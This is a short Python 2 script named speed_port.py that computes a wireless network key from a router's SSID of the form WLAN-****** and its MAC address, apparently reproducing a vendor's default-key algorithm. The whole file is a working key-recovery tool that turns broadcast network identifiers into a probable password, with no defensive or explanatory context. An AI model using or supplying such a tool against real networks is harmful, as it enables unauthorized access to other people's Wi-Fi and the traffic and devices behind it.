#!/usr/bin/python2
import sys
  
def main(argv):
    if(len(argv) != 3):
        help()
        sys.exit(1)

    ssid, mac = argv[1], argv[2]
    key = input_2_key(ssid, mac)
    print ssid, mac, key

def input_2_key(ssid, mac):
    mac = str.upper(mac).replace(':',"")
    return ssid[9]+'Z'+ ssid[10]+str(ord(mac[8]))+str(ord(mac[9]))+str(ord(mac[10]))+'XYZ'+str(ord(ssid[6]))+ str(ord(ssid[7]))

def help():
    print "usage: speed_port.py ssid mac"
    print " ssid : WLAN-******"
    print " mac  : **:**:**:**:**:**"

if __name__ == "__main__":
    main(sys.argv)

